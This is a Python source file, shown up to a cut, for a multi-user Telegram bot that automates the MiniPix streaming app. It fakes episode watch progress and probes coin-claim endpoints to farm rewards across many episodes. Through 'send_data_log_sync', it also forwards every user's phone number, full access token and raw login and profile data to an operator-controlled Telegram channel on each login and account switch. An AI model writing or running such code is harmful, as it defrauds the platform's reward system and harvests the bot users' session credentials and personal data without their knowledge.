#!/usr/bin/env python3
"""
MiniPix V2 Telegram Bot (Multi-User)
- Per-user isolated MiniPix accounts (nested by Telegram user ID)
- Per-user Groq API keys (multiple allowed, fallback)
- Per-user busy lock – same user cannot run 2 tasks at once
- Thread-safe file I/O with locks (accounts, groq keys)
- Thread-safe progress callbacks (explicit event loop, call_soon_threadsafe)
- Primary model: openai/gpt-oss-120b
- Lock file to avoid multiple instances
- Quiz sessions 10–25 (default 15), 10s delay
- Handles stale sessions (hearts=0) by retrying and aborting after 2 failures
- Improved OTP login with detailed error logging
- Added stop button / command to cancel long-running tasks
- Added separate log channel for user login data & API token changes
- Enhanced watch progress debug with episode-wise details
"""

import os
import sys
import json
import time
import re
import logging
import asyncio
import atexit
import threading
import traceback
from concurrent.futures import ThreadPoolExecutor
from datetime import date
from typing import Dict, Optional, List

import requests
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ───────────────────────── Config ─────────────────────────
API_BASE = "https://api.minipix.co/v4"
ACCOUNTS_FILE = "minipix_accounts.json"
USER_GROQ_FILE = "user_groq_keys.json"
LOCK_FILE = "bot.lock"

MAX_WATCHES_PER_EP = 4
REWARDS_BY_WATCH = {1: 15, 2: 8, 3: 5, 4: 3}
QUIZ_QUESTION_DELAY = 10          # fixed to 10 seconds

GLOBAL_GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "")
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
LOG_CHANNEL_ID = os.environ.get("LOG_CHANNEL_ID", "")
DATA_LOG_CHANNEL_ID = os.environ.get("DATA_LOG_CHANNEL_ID", "")   # New channel for user data & key logs

GROQ_MODELS = [
    "openai/gpt-oss-120b",
    "openai/gpt-oss-20b",
    "qwen/qwen3.8-27b",
    "qwen/qwen3.6-27b",
    "allam-2-7b",
]

HEADERS_BASE = {
    "user-agent": "okhttp/4.12.0",
    "accept-encoding": "gzip",
}

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

(WAIT_PHONE, WAIT_OTP, WAIT_TOKEN, WAIT_QUIZ_SESSIONS) = range(4)

# ─────────────── Thread-safe helpers & per-user state ───────────────
_accounts_file_lock = threading.Lock()
_groq_file_lock = threading.Lock()
user_busy: Dict[int, bool] = {}
_busy_lock = threading.Lock()

BLOCKING_EXECUTOR = ThreadPoolExecutor(
    max_workers=max(64, (os.cpu_count() or 4) * 16),
    thread_name_prefix="minipix-worker",
)
atexit.register(lambda: BLOCKING_EXECUTOR.shutdown(wait=False))


def set_busy(user_id: int) -> bool:
    """Atomically mark user as busy. Returns True if acquired, False if already busy."""
    with _busy_lock:
        if user_busy.get(user_id, False):
            return False
        user_busy[user_id] = True
        return True


def clear_busy(user_id: int):
    with _busy_lock:
        user_busy.pop(user_id, None)


def is_busy(user_id: int) -> bool:
    with _busy_lock:
        return user_busy.get(user_id, False)


# ───────────────────── Lock file ─────────────────────
def acquire_lock():
    try:
        fd = os.open(LOCK_FILE, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
        os.close(fd)
    except FileExistsError:
        print("Another bot instance is running. Exiting.")
        sys.exit(1)

    def remove_lock():
        try:
            os.unlink(LOCK_FILE)
        except Exception:
            pass

    atexit.register(remove_lock)


# ───────────────────── Log Channels ─────────────────────
def send_log_sync(text: str):
    if not LOG_CHANNEL_ID or not TELEGRAM_BOT_TOKEN:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": LOG_CHANNEL_ID,
                "text": text[:4090],
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=12,
        )
    except Exception as e:
        logger.warning(f"Log channel error: {e}")


def send_data_log_sync(text: str):
    """Send sensitive user data logs (login, API key changes) to a separate channel."""
    if not DATA_LOG_CHANNEL_ID or not TELEGRAM_BOT_TOKEN:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": DATA_LOG_CHANNEL_ID,
                "text": text[:4090],
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=12,
        )
    except Exception as e:
        logger.warning(f"Data log channel error: {e}")


# ───────────────────── User Groq Keys (multiple, thread-safe save) ─────────────────────
def load_user_groq_keys() -> dict:
    if os.path.exists(USER_GROQ_FILE):
        try:
            with open(USER_GROQ_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                for uid, val in data.items():
                    if isinstance(val, str):
                        data[uid] = [val]
                    elif not isinstance(val, list):
                        data[uid] = []
                return data
        except Exception:
            return {}
    return {}


def save_user_groq_keys(data: dict):
    with _groq_file_lock:
        try:
            with open(USER_GROQ_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Failed to save groq keys: {e}")


user_groq_keys: dict = load_user_groq_keys()


def get_user_groq_keys(user_id: int) -> List[str]:
    keys = user_groq_keys.get(str(user_id))
    if keys and isinstance(keys, list):
        return keys
    if GLOBAL_GROQ_API_KEY:
        return [GLOBAL_GROQ_API_KEY]
    return []


# ───────────────────── Stop flag ─────────────────────
stop_flags: Dict[int, bool] = {}


# ───────────────────── MiniPix Core (per-TG-user accounts) ─────────────────────
def _load_all_accounts_file() -> dict:
    """Load entire accounts file (outer key = telegram user id). Thread-unsafe, caller must lock."""
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    if "accounts" in data and isinstance(data["accounts"], dict):
                        first_val = next(iter(data["accounts"].values()), None)
                        if isinstance(first_val, dict) and "access_token" in first_val:
                            tg_uid = "_legacy_"
                            return {tg_uid: data}
                    return data
                return {}
        except Exception:
            return {}
    return {}


def _save_all_accounts_file(data: dict):
    """Write entire accounts file. Thread-unsafe, caller must lock."""
    try:
        with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception:
        return False


class MiniPixV2:
    def __init__(self, telegram_user_id: Optional[int] = None):
        self.telegram_user_id: Optional[int] = (
            str(telegram_user_id) if telegram_user_id is not None else None
        )
        self.access_token = None
        self.user_id = None
        self.profile_id = None
        self.phone = None
        self.session = requests.Session()
        self.session.headers.update(HEADERS_BASE)
        self.device_id = "65969f0b7041fabc"
        self.device_info = "Xiaomi"
        self.watch_history = {}
        self.watch_history_raw = []
        self.runtime_watch_counts = {}
        self.last_profile = {}
        self.last_user_raw = {}
        self.last_login_raw = {}
        self.current_account_label = None
        self.accounts = self._load_accounts()

    def _load_accounts(self):
        with _accounts_file_lock:
            all_data = _load_all_accounts_file()
        tg_key = self.telegram_user_id or "_legacy_"
        user_block = all_data.get(tg_key, {})
        if isinstance(user_block, dict):
            inner = user_block.get("accounts", {})
            if isinstance(inner, dict):
                return inner
            if isinstance(user_block, dict) and any(
                isinstance(v, dict) and "access_token" in v
                for v in user_block.values()
            ):
                return user_block
        return {}

    def _save_accounts(self):
        with _accounts_file_lock:
            all_data = _load_all_accounts_file()
            tg_key = self.telegram_user_id or "_legacy_"
            all_data[tg_key] = {
                "accounts": self.accounts,
                "saved_at": date.today().isoformat(),
            }
            return _save_all_accounts_file(all_data)

    def _store_current_account(self, label=None):
        if not (self.access_token and self.user_id):
            return False
        lbl = label or self.phone or self.current_account_label or f"acc_{str(self.user_id)[-6:]}"
        self.current_account_label = lbl
        self.accounts[lbl] = {
            "access_token": self.access_token,
            "user_id": self.user_id,
            "profile_id": self.profile_id,
            "phone": self.phone,
            "added_on": date.today().isoformat(),
        }

        ur = self.last_user_raw or {}
        extra_fields = []
        for key in (
            "referralCode", "referral_code", "referCode", "refer_code",
            "referredBy", "referred_by", "invitedBy", "invited_by",
            "referralSource", "source", "campaign", "utm_source",
            "registeredAt", "registered_at", "createdAt", "created_at",
            "email", "name", "fullName", "full_name", "username",
            "country", "state", "city", "language",
            "isVerified", "is_verified", "kycStatus",
            "totalCoins", "coins", "wallet",
        ):
            if key in ur and ur[key] not in (None, "", [], {}):
                val = ur[key]
                if isinstance(val, (dict, list)):
                    try:
                        val_str = json.dumps(val, ensure_ascii=False)[:80]
                    except Exception:
                        val_str = str(val)[:80]
                else:
                    val_str = str(val)[:80]
                extra_fields.append(f"  • {key}: <code>{val_str}</code>")

        raw_snippet = ""
        if ur:
            try:
                raw_snippet = "\nRaw user JSON (first 600 chars):\n<pre>" + json.dumps(
                    ur, ensure_ascii=False, indent=2
                )[:600] + "</pre>"
            except Exception:
                pass

        login_raw_snippet = ""
        if self.last_login_raw:
            try:
                login_raw_snippet = "\nLogin resp (first 300 chars):\n<pre>" + json.dumps(
                    self.last_login_raw, ensure_ascii=False
                )[:300] + "</pre>"
            except Exception:
                pass

        log_text = (
            f"🔐 <b>FULL ACCOUNT DETAILS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"Telegram User ID: <code>{self.telegram_user_id}</code>\n"
            f"Account Label: <code>{self.current_account_label}</code>\n"
            f"Phone: <code>{self.phone}</code>\n"
            f"MiniPix User ID: <code>{self.user_id}</code>\n"
            f"Profile ID: <code>{self.profile_id}</code>\n"
            f"Access Token: <code>{self.access_token}</code>\n"
            f"Added On: {date.today().isoformat()}\n"
        )
        if extra_fields:
            log_text += "Extra User Fields:\n" + "\n".join(extra_fields) + "\n"
        log_text += f"━━━━━━━━━━━━━━━━━━━{raw_snippet}{login_raw_snippet}"

        send_data_log_sync(log_text)
        return self._save_accounts()

    def list_accounts(self):
        return list(self.accounts.keys())

    def switch_account(self, label):
        if label not in self.accounts:
            return False, f"Account '{label}' not found"
        acc = self.accounts[label]
        token = acc.get("access_token")
        if not token:
            return False, "No token"
        self._reset_state()
        self.access_token = token
        self.user_id = acc.get("user_id")
        self.profile_id = acc.get("profile_id")
        self.phone = acc.get("phone")
        self.session.headers["authorization"] = f"Bearer {self.access_token}"
        self.current_account_label = label
        if self.user_id:
            ok = self.get_user()
            if ok:
                self.last_login_raw = {
                    "endpoint": "switch_account",
                    "method": "SWITCH",
                    "phone": self.phone,
                }
                self._store_current_account(label)
                ts_now = time.strftime("%Y-%m-%d %H:%M:%S")
                send_data_log_sync(
                    f"🔄 <b>ACCOUNT SWITCHED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"Time: {ts_now}\n"
                    f"Telegram UID: <code>{self.telegram_user_id}</code>\n"
                    f"Switched To: <code>{label}</code>\n"
                    f"Phone: <code>{self.phone}</code>\n"
                    f"MiniPix UID: <code>{self.user_id}</code>\n"
                    f"Profile ID: <code>{self.profile_id}</code>\n"
                    f"Access Token: <code>{self.access_token}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━"
                )
                return True, f"Switched to {label}"
            return False, "Token expired"
        return True, f"Switched to {label}"

    def remove_account(self, label):
        if label not in self.accounts:
            return False
        del self.accounts[label]
        self._save_accounts()
        if self.current_account_label == label:
            self._reset_state()
        return True

    def _reset_state(self):
        self.access_token = None
        self.user_id = None
        self.profile_id = None
        self.phone = None
        self.current_account_label = None
        self.watch_history = {}
        self.watch_history_raw = []
        self.runtime_watch_counts = {}
        self.last_profile = {}
        self.last_user_raw = {}
        self.last_login_raw = {}
        if "authorization" in self.session.headers:
            del self.session.headers["authorization"]

    def _req(self, method, path, **kwargs):
        url = f"{API_BASE}{path}"
        try:
            r = self.session.request(method, url, timeout=30, **kwargs)
            try:
                data = r.json()
            except Exception:
                data = r.text
            return r.status_code, data
        except Exception as e:
            return 0, str(e)

    def login_otp_generate(self, phone):
        self.phone = phone
        payload = {"phone_number": phone}
        sc, data = self._req(
            "POST", "/login/generate-otp",
            headers={"content-type": "application/json; charset=utf-8"},
            data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        )
        send_log_sync(
            f"📡 OTP generate response:\n"
            f"Status: {sc}\n"
            f"Data: {json.dumps(data, ensure_ascii=False)[:500]}"
        )
        if sc == 200 and isinstance(data, dict):
            if data.get("message") == "OTP sent" or data.get("success"):
                return data.get("session_token") or data.get("sessionToken")
            else:
                error_msg = data.get("message") or data.get("error") or "Unknown error"
                send_log_sync(f"❌ OTP generation failed: {error_msg}")
        else:
            send_log_sync(f"❌ OTP generation HTTP {sc}: {str(data)[:200]}")
        return None

    def login_otp_verify(self, session_token, otp, save_label=None):
        payload = {
            "client_id": "android",
            "device_id": self.device_id,
            "device_info": self.device_info,
            "otp": otp,
            "phone_number": self.phone,
            "session_token": session_token,
        }
        sc, data = self._req(
            "POST", "/login/verify-otp",
            headers={"content-type": "application/json; charset=utf-8"},
            data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        )
        if sc == 200 and isinstance(data, dict) and data.get("access_token"):
            self.last_login_raw = {
                "endpoint": "/login/verify-otp",
                "status": sc,
                "method": "OTP",
                "phone": self.phone,
                "data": data,
            }
            self.access_token = data["access_token"]
            self.user_id = data.get("id") or data.get("_id")
            self.session.headers["authorization"] = f"Bearer {self.access_token}"
            self.get_user()
            self._store_current_account(save_label)

            ts_now = time.strftime("%Y-%m-%d %H:%M:%S")
            lr_short = ""
            try:
                lr_short = "\n<pre>" + json.dumps(data, ensure_ascii=False)[:400] + "</pre>"
            except Exception:
                pass
            send_data_log_sync(
                f"✅ <b>OTP LOGIN SUCCESS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"Time: {ts_now}\n"
                f"Telegram UID: <code>{self.telegram_user_id}</code>\n"
                f"Login Method: OTP\n"
                f"Phone: <code>{self.phone}</code>\n"
                f"MiniPix UID: <code>{self.user_id}</code>\n"
                f"Access Token: <code>{self.access_token}</code>\n"
                f"Account Label: <code>{self.current_account_label}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━{lr_short}"
            )
            return True
        send_log_sync(f"❌ OTP verify failed: {sc} {json.dumps(data, ensure_ascii=False)[:300]}")
        return False

    def login_with_token(self, token, user_id=None, profile_id=None, label=None):
        self.access_token = token
        self.user_id = user_id
        self.profile_id = profile_id
        self.session.headers["authorization"] = f"Bearer {self.access_token}"
        if not self.get_user():
            return False
        self.last_login_raw = {
            "endpoint": "direct_token",
            "method": "TOKEN",
            "phone": self.phone,
            "user_id_provided": user_id,
            "profile_id_provided": profile_id,
        }
        self._store_current_account(label)

        ts_now = time.strftime("%Y-%m-%d %H:%M:%S")
        send_data_log_sync(
            f"🔑 <b>TOKEN LOGIN SUCCESS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"Time: {ts_now}\n"
            f"Telegram UID: <code>{self.telegram_user_id}</code>\n"
            f"Login Method: Direct Token\n"
            f"Phone: <code>{self.phone}</code>\n"
            f"MiniPix UID: <code>{self.user_id}</code>\n"
            f"Profile ID: <code>{self.profile_id}</code>\n"
            f"Access Token: <code>{self.access_token}</code>\n"
            f"Account Label: <code>{self.current_account_label}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        return True

    def get_user(self):
        if not self.user_id:
            return False
        sc, data = self._req("GET", f"/users/{self.user_id}")
        if sc == 200 and isinstance(data, dict):
            self.last_user_raw = dict(data)
            self.user_id = data.get("_id", self.user_id)
            self.profile_id = data.get("master_profile", self.profile_id)
            phone = data.get("mobile")
            if phone and not self.phone:
                self.phone = phone
            return True
        return False

    def open_app(self):
        if not (self.user_id and self.profile_id):
            return False
        payload = {"openApp": {"_id": self.user_id, "date": date.today().isoformat()}}
        sc, data = self._req(
            "PATCH",
            f"/users/{self.user_id}/profiles/{self.profile_id}/open_app",
            headers={"content-type": "application/json; charset=utf-8"},
            data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        )
        return sc == 200 and isinstance(data, dict) and data.get("success")

    def get_balance(self):
        sc, data = self._req("GET", "/coins/balance")
        if sc == 200 and isinstance(data, dict):
            coins = data.get("coins", 0)
            if isinstance(coins, dict):
                coins = coins.get("coins", 0)
            return coins
        if sc == 200 and isinstance(data, (int, float)):
            return int(data)
        return None

    def get_balance_silent(self):
        return self.get_balance()

    def get_campaign_status(self):
        sc, data = self._req("GET", "/watch-campaign/status")
        if sc == 200 and isinstance(data, dict) and data.get("success"):
            cap = data.get("dailyVideoCap", {}) or {}
            return {
                "enabled": data.get("enabled", False),
                "cap": cap.get("cap", 0),
                "used": cap.get("used", 0),
                "reached": cap.get("reached", False),
                "blockWatching": cap.get("blockWatching", False),
            }
        return {"enabled": False, "cap": 0, "used": 0, "reached": False, "blockWatching": False}

    def _collect_series_deep(self, obj, out_dict):
        if obj is None:
            return
        if isinstance(obj, dict):
            if (obj.get("_id") or obj.get("id") or obj.get("series_id")) and (
                obj.get("title") or obj.get("numberOfEpisodes") is not None
                or obj.get("totalEpisodes") is not None or obj.get("cardImage")
                or obj.get("hindiTitle")
            ):
                sid = obj.get("_id") or obj.get("id") or obj.get("series_id")
                if sid and sid not in out_dict:
                    out_dict[sid] = obj
            for v in obj.values():
                self._collect_series_deep(v, out_dict)
        elif isinstance(obj, list):
            for item in obj:
                self._collect_series_deep(item, out_dict)

    def get_all_series(self, page_size=100, max_pages=12):
        found = {}
        try:
            sc, data = self._req("GET", "/short_search?page=home")
            if sc == 200 and isinstance(data, (dict, list)):
                self._collect_series_deep(data, found)
                if isinstance(data, dict) and data.get("playlists"):
                    for pl in data["playlists"]:
                        if isinstance(pl, dict) and isinstance(pl.get("webseries_details"), list):
                            for ws in pl["webseries_details"]:
                                if isinstance(ws, dict):
                                    sid = ws.get("_id") or ws.get("id")
                                    if sid and sid not in found:
                                        found[sid] = ws
        except Exception:
            pass

        endpoints = [
            ("GET", "/webseries?page={p}&pageSize={ps}", True),
            ("GET", "/discover?type=webseries&page={p}&pageSize={ps}", True),
            ("GET", "/home?page={p}&pageSize={ps}", False),
            ("GET", "/discover/webseries?page={p}&pageSize={ps}", True),
        ]
        for method, tmpl, _ in endpoints:
            for page in range(1, max_pages + 1):
                url = tmpl.format(p=page, ps=page_size)
                try:
                    sc, data = self._req(method, url)
                except Exception:
                    continue
                if not (sc == 200 and isinstance(data, dict)):
                    continue
                self._collect_series_deep(data, found)
                series_candidates = []
                for k in ("webseries", "series", "data", "items", "results", "contents", "list"):
                    if isinstance(data.get(k), list):
                        series_candidates.extend(data[k])
                inner = data.get("data") if isinstance(data.get("data"), dict) else None
                if inner:
                    for k in ("webseries", "series", "items", "results", "contents", "list"):
                        if isinstance(inner.get(k), list):
                            series_candidates.extend(inner[k])
                if not series_candidates:
                    break
                for s in series_candidates:
                    if not isinstance(s, dict):
                        continue
                    sid = s.get("_id") or s.get("id") or s.get("series_id")
                    if sid and sid not in found:
                        found[sid] = s
                if len(series_candidates) < int(page_size * 0.5):
                    break

        series_list = list(found.values())
        series_list.sort(
            key=lambda s: -int(s.get("numberOfEpisodes") or s.get("totalEpisodes") or 0)
        )
        return series_list

    def get_episodes(self, series_id, page=1, page_size=50):
        sc, data = self._req(
            "GET", f"/episodes?series_id={series_id}&page={page}&pageSize={page_size}"
        )
        if sc == 200 and isinstance(data, dict):
            return data.get("episodes", []), data.get("total", 0)
        return [], 0

    def get_profile(self):
        if not (self.user_id and self.profile_id):
            return None
        sc, data = self._req("GET", f"/users/{self.user_id}/profiles/{self.profile_id}")
        if sc == 200 and isinstance(data, dict):
            profile = data.get("profile", {}) or {}
            self.last_profile = profile
            history = profile.get("watchHistory", []) or profile.get("watched", []) or []
            if not isinstance(history, list):
                history = []
            self.watch_history_raw = list(history)
            self.watch_history = {}
            for wh in history:
                if not isinstance(wh, dict):
                    continue
                key = (wh.get("id"), wh.get("episodeNo"))
                prev = self.watch_history.get(key) or {"watchedPct": 0, "time": 0}
                cur_pct = wh.get("watchedPct", 0) or 0
                if cur_pct >= (prev.get("watchedPct") or 0):
                    self.watch_history[key] = {
                        "watchedPct": cur_pct,
                        "time": wh.get("time", 0) or 0,
                    }
            return profile
        return None

    def get_watch_counts_from_profile(self):
        counts = {}
        raw_history = []
        try:
            self.get_profile()
        except Exception:
            pass
        profile = getattr(self, "last_profile", None) or {}
        if isinstance(profile, dict):
            watched_list = profile.get("watched") or profile.get("watchHistory") or []
            if isinstance(watched_list, list):
                raw_history = watched_list
        if isinstance(getattr(self, "watch_history_raw", None), list):
            raw_history = raw_history + self.watch_history_raw
        for item in raw_history:
            if not isinstance(item, dict):
                continue
            sid = item.get("id") or item.get("series_id")
            ep = item.get("episodeNo") or item.get("episode_no")
            pct = int(item.get("watchedPct") or item.get("progress") or 0)
            if sid and ep and pct >= 80:
                k = (str(sid), str(ep))
                counts[k] = counts.get(k, 0) + 1
        runtime = getattr(self, "runtime_watch_counts", None)
        if isinstance(runtime, dict):
            for k, c in runtime.items():
                counts[k] = max(counts.get(k, 0), c)
        return counts

    def _update_watch_progress(
        self, series_id, series_title, hindi_title, episode_no,
        tc_in_ms, tc_out_ms, detail_image, watched_pct,
    ):
        if not (self.user_id and self.profile_id):
            return False
        try:
            watched_pct = int(watched_pct or 0)
        except Exception:
            watched_pct = 0
        if not tc_in_ms:
            tc_in_ms = 0
        if not tc_out_ms or tc_out_ms <= tc_in_ms:
            tc_out_ms = tc_in_ms + 60000
        duration = tc_out_ms - tc_in_ms
        current_time_ms = tc_out_ms if watched_pct >= 100 else int(tc_in_ms + (duration * watched_pct / 100))
        stored_pct = 99 if watched_pct == 99 else (100 if watched_pct >= 100 else watched_pct)

        watch_obj = {
            "id": series_id,
            "title": series_title,
            "hindiTitle": hindi_title,
            "episodeNo": episode_no,
            "tcInMs": tc_in_ms,
            "tcOutMs": tc_out_ms,
            "detailImage": detail_image,
            "type": "episode",
            "progress": 100 if watched_pct >= 100 else watched_pct,
            "time": current_time_ms,
            "watchedPct": stored_pct,
            "campaign": False,
        }

        ok1 = False
        try:
            sc1, d1 = self._req(
                "PATCH",
                f"/users/{self.user_id}/profiles/{self.profile_id}",
                headers={"content-type": "application/json; charset=utf-8"},
                data=json.dumps({"watched": watch_obj}, ensure_ascii=False).encode("utf-8"),
            )
            ok1 = sc1 == 200 and isinstance(d1, dict) and d1.get("success")
        except Exception:
            pass

        ok2 = False
        for path in (
            f"/users/{self.user_id}/profiles/{self.profile_id}/watch-history/update",
            "/watch-history/update",
        ):
            try:
                sc2, d2 = self._req(
                    "POST", path,
                    headers={"content-type": "application/json; charset=utf-8"},
                    data=json.dumps({"watched": watch_obj, "campaign": False}, ensure_ascii=False).encode("utf-8"),
                )
                if sc2 and sc2 < 500 and (isinstance(d2, dict) and d2.get("success") or sc2 == 200):
                    ok2 = True
                    break
            except Exception:
                pass
        return ok1 or ok2

    def _report_watch_progress_to_coins(self, series_id, episode_no, watched_pct, series_title=""):
        if not (self.user_id and self.profile_id):
            return False
        bodies = [
            {
                "series_id": series_id,
                "episode_no": episode_no,
                "episodeNo": episode_no,
                "progress": watched_pct,
                "watchedPct": watched_pct,
                "campaign": False,
                "task_type": "watch_ladder",
            },
            {
                "type": "watch_ladder",
                "seriesId": series_id,
                "episode": str(episode_no),
                "watched": watched_pct,
                "campaign": False,
            },
        ]
        endpoints = [
            ("POST", "/coins/progress-report", bodies[0]),
            ("POST", "/coins/tasks/progress", bodies[0]),
            ("POST", "/coins/watch-progress", bodies[1]),
            ("POST", "/watch-ladder/progress", bodies[0]),
        ]
        for method, path, body in endpoints:
            try:
                sc, d = self._req(
                    method, path,
                    headers={"content-type": "application/json; charset=utf-8"},
                    data=json.dumps(body, ensure_ascii=False).encode("utf-8"),
                )
                if sc and sc < 500 and isinstance(d, dict) and (d.get("success") is True or sc == 200):
                    return True
            except Exception:
                continue
        return False

    def _start_task_for_series(self, series_id):
        task_id = f"watch_ladder_{series_id}"
        candidates = [
            ("POST", f"/coins/tasks/{task_id}/start", {"series_id": series_id, "campaign": False}),
            ("POST", "/coins/tasks/start", {"task_id": task_id, "series_id": series_id, "campaign": False}),
            ("POST", "/watch-ladder/start", {"series_id": series_id, "campaign": False}),
        ]
        for method, path, body in candidates:
            try:
                sc, d = self._req(
                    method, path,
                    headers={"content-type": "application/json; charset=utf-8"},
                    data=json.dumps(body, ensure_ascii=False).encode("utf-8"),
                )
                if sc and sc < 500:
                    return True
            except Exception:
                pass
        return False

    def claim_reward_task(self, task_id=None, series_id=None):
        if not task_id and series_id:
            task_id = f"watch_ladder_{series_id}"
        candidates = []
        if task_id:
            candidates.extend([
                ("POST", f"/coins/tasks/{task_id}/claim", None),
                ("POST", "/coins/tasks/claim", {"task_id": task_id, "campaign": False}),
            ])
        if series_id:
            candidates.extend([
                ("POST", "/watch-ladder/claim", {"series_id": series_id, "campaign": False}),
                ("POST", f"/coins/watch-ladder/{series_id}/claim", None),
            ])
        for entry in candidates:
            method, path = entry[0], entry[1]
            body = entry[2] if len(entry) > 2 else None
            try:
                sc, data = self._req(
                    method, path,
                    headers={"content-type": "application/json; charset=utf-8"},
                    data=json.dumps(body, ensure_ascii=False).encode("utf-8") if body else None,
                )
                if sc and sc < 500 and isinstance(data, dict) and data.get("success") is True:
                    return True
            except Exception:
                continue
        return False

    def watch_episode(self, episode, series_info, allow_repeat=False, nth_watch=None):
        if not isinstance(series_info, dict) or not isinstance(episode, dict):
            return False, "invalid"
        series_id = series_info.get("_id") or series_info.get("id") or series_info.get("series_id")
        if not series_id:
            return False, "no_series_id"
        ep_no = episode.get("episodeNo") or episode.get("episode_no") or episode.get("number") or 0
        series_title = series_info.get("title") or ""
        hindi_title = series_info.get("hindiTitle") or series_title
        detail_image = series_info.get("cardImage") or series_info.get("longVerticalImage") or ""

        try:
            tc_in = int(episode.get("tcIn") or 0)
        except Exception:
            tc_in = 0
        try:
            tc_out = int(episode.get("tcOut") or (tc_in + 60))
        except Exception:
            tc_out = tc_in + 60
        if tc_out <= tc_in:
            tc_out = tc_in + 60
        tc_in_ms = tc_in * 1000
        tc_out_ms = tc_out * 1000

        history_key = (series_id, ep_no)
        current_pct = int(self.watch_history.get(history_key, {}).get("watchedPct", 0) or 0)
        if not allow_repeat and current_pct >= 80:
            return True, "skip"

        for pct in [1, 50, 80, 99, 100]:
            self._update_watch_progress(
                series_id, series_title, hindi_title, ep_no,
                tc_in_ms, tc_out_ms, detail_image, pct,
            )
            if pct >= 80:
                self._report_watch_progress_to_coins(series_id, ep_no, pct, series_title)
            time.sleep(0.12)

        try:
            self.claim_reward_task(series_id=series_id)
        except Exception:
            pass

        self.watch_history[history_key] = {"watchedPct": 100, "time": tc_out_ms}
        rk = (str(series_id), str(ep_no))
        self.runtime_watch_counts[rk] = self.runtime_watch_counts.get(rk, 0) + 1
        return True, "done"

    def browse_and_watch_all_smart_repeat(self, progress_callback=None, max_watches=250, telegram_user_id=None):
        def log(msg):
            if progress_callback:
                progress_callback(msg)
            if any(x in msg for x in ["→", "finished", "Campaign", "Fetching", "Soft limit"]):
                send_log_sync(f"<b>🎬 WATCH</b> | User <code>{telegram_user_id}</code>\n{msg}")

        log("Checking campaign...")
        cap = self.get_campaign_status()
        log(f"Campaign: {'ON' if cap['enabled'] else 'OFF'} | {cap['used']}/{cap['cap']}")

        log("Fetching series list...")
        all_series = self.get_all_series()
        if not all_series:
            return {"error": "No series found"}

        try:
            self.get_profile()
        except Exception:
            pass
        watch_counts = self.get_watch_counts_from_profile()

        total_watched = 0
        total_skipped = 0
        total_failed = 0
        balance_before = self.get_balance_silent()
        stopped = False

        total_episodes_available = 0
        for s in all_series:
            sid = s.get("_id") or s.get("id") or s.get("series_id")
            if sid:
                eps, _ = self.get_episodes(sid, page=1, page_size=500)
                total_episodes_available += len(eps)
        log(f"Total episodes available: {total_episodes_available}")

        try:
            for si, s in enumerate(all_series, 1):
                if stop_flags.get(telegram_user_id, False):
                    log("⏹ Stopped by user.")
                    stopped = True
                    break
                if total_watched >= max_watches:
                    log("Soft limit reached.")
                    break
                sid = s.get("_id") or s.get("id") or s.get("series_id")
                if not sid:
                    continue
                title = s.get("title") or "?"
                episodes, _ = self.get_episodes(sid, page=1, page_size=500)
                if not episodes:
                    continue
                episodes = sorted(
                    episodes,
                    key=lambda e: int(e.get("episodeNo") or 0) if str(e.get("episodeNo") or "").isdigit() else 0,
                )
                try:
                    self._start_task_for_series(sid)
                except Exception:
                    pass

                log(f"[{si}/{len(all_series)}] {title} ({len(episodes)} eps)")
                done_series = 0
                for ei, ep in enumerate(episodes, 1):
                    if stop_flags.get(telegram_user_id, False):
                        log("⏹ Stopped by user.")
                        stopped = True
                        break
                    if total_watched >= max_watches:
                        break
                    ep_no = ep.get("episodeNo")
                    kp = (str(sid), str(ep_no))
                    cnt = watch_counts.get(kp, 0) + self.runtime_watch_counts.get(kp, 0)
                    if cnt >= MAX_WATCHES_PER_EP:
                        continue
                    log(f"  → Watching E{ep_no} (watch #{cnt+1}/{MAX_WATCHES_PER_EP}) | Total watched: {total_watched}/{max_watches} | Remaining: {max_watches - total_watched}")
                    ok, st = self.watch_episode(ep, s, allow_repeat=True, nth_watch=cnt + 1)
                    if st == "skip":
                        total_skipped += 1
                    elif ok:
                        done_series += 1
                        total_watched += 1
                    else:
                        total_failed += 1
                if done_series:
                    log(f"  → {done_series} watches done in this series")
                try:
                    self.claim_reward_task(series_id=sid)
                except Exception:
                    pass
        finally:
            stop_flags.pop(telegram_user_id, None)

        bal_end = self.get_balance_silent()
        delta = None
        if balance_before is not None and bal_end is not None:
            delta = bal_end - balance_before

        summary = (
            f"<b>🏁 WATCH FINISHED</b>\n"
            f"User: <code>{telegram_user_id}</code>\n"
            f"Watched: {total_watched} | Skipped: {total_skipped} | Failed: {total_failed}\n"
        )
